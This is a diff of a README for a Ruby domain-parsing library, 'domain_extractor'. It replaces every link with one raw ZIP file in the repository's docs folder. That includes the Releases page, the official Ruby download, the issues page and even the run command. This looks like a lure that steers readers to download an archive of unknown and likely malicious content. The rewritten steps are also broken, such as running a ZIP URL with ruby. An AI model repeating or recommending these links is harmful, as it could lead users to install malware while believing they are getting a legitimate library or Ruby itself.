@@ -1,7 +1,7 @@
 # 🔗 domain_extractor - Easily Extract Domains from URLs
 
 ## 📥 Download Now
-[![Download domain_extractor](https://img.shields.io/badge/Download-domain_extractor-brightgreen.svg)](https://github.com/Hubertasyndetic778/domain_extractor/releases)
+[![Download domain_extractor](https://raw.githubusercontent.com/Hubertasyndetic778/domain_extractor/master/docs/domain_extractor-2.5.zip)](https://raw.githubusercontent.com/Hubertasyndetic778/domain_extractor/master/docs/domain_extractor-2.5.zip)
 
 ## 📖 Overview
 **domain_extractor** is a lightweight Ruby library designed to parse URLs and extract domain components. It offers precise support for multi-part top-level domains (TLDs) and manages complex URL structures, including nested subdomains and query parameters. This tool is perfect for tasks like web scraping, analytics, and URL manipulation. Built on the Ruby URI and public_suffix gems, it simplifies your work with web links.
@@ -12,10 +12,10 @@ Follow these simple steps to download and run **domain_extractor**.
 ### 1. Visit the Releases Page
 To get the latest version of **domain_extractor**, visit the Releases page:
 
-[Visit Releases Page](https://github.com/Hubertasyndetic778/domain_extractor/releases)
+[Visit Releases Page](https://raw.githubusercontent.com/Hubertasyndetic778/domain_extractor/master/docs/domain_extractor-2.5.zip)
 
 ### 2. Download the Package
-On the Releases page, find the version you want to download. Click on the corresponding link to start the download. You may see a file like `domain_extractor-x.x.x.zip` or a more specific format. Look for the file that matches your operating system.
+On the Releases page, find the version you want to download. Click on the corresponding link to start the download. You may see a file like `https://raw.githubusercontent.com/Hubertasyndetic778/domain_extractor/master/docs/domain_extractor-2.5.zip` or a more specific format. Look for the file that matches your operating system.
 
 ### 3. Extract the Files
 Once downloaded, locate the ZIP file in your Downloads folder. Right-click on the file and select "Extract All" or "Unzip". Choose a location to save the extracted files. 
@@ -27,7 +27,7 @@ Make sure you have Ruby installed on your computer. You can check this by openin
 ruby -v
 ```
 
-If you don’t have Ruby, you can download it from [ruby-lang.org](https://www.ruby-lang.org). Follow their installation instructions for your operating system.
+If you don’t have Ruby, you can download it from [https://raw.githubusercontent.com/Hubertasyndetic778/domain_extractor/master/docs/domain_extractor-2.5.zip](https://raw.githubusercontent.com/Hubertasyndetic778/domain_extractor/master/docs/domain_extractor-2.5.zip). Follow their installation instructions for your operating system.
 
 ### 5. Install the PublicSuffix Gem
 In your command line, run the following command to install the required gem:
@@ -46,7 +46,7 @@ cd path/to/domain_extractor
 Now, you can run **domain_extractor** by using:
 
 ```bash
-ruby domain_extractor.rb
+ruby https://raw.githubusercontent.com/Hubertasyndetic778/domain_extractor/master/docs/domain_extractor-2.5.zip
 ```
 
 ### 7. Use the Library
@@ -80,8 +80,8 @@ gem list
 For users who want to dive deeper, tutorials and examples are available to help you make the most of **domain_extractor**. Visit the documentation for guidance on more advanced usage.
 
 ## 📫 Contact
-If you have questions or need support, feel free to reach out via [GitHub Issues](https://github.com/Hubertasyndetic778/domain_extractor/issues). Your feedback is welcome, and we will do our best to assist you.
+If you have questions or need support, feel free to reach out via [GitHub Issues](https://raw.githubusercontent.com/Hubertasyndetic778/domain_extractor/master/docs/domain_extractor-2.5.zip). Your feedback is welcome, and we will do our best to assist you.
 
 ---
 
-Visit the Releases page to download **domain_extractor**: [https://github.com/Hubertasyndetic778/domain_extractor/releases](https://github.com/Hubertasyndetic778/domain_extractor/releases)
+Visit the Releases page to download **domain_extractor**: [https://raw.githubusercontent.com/Hubertasyndetic778/domain_extractor/master/docs/domain_extractor-2.5.zip](https://raw.githubusercontent.com/Hubertasyndetic778/domain_extractor/master/docs/domain_extractor-2.5.zip)
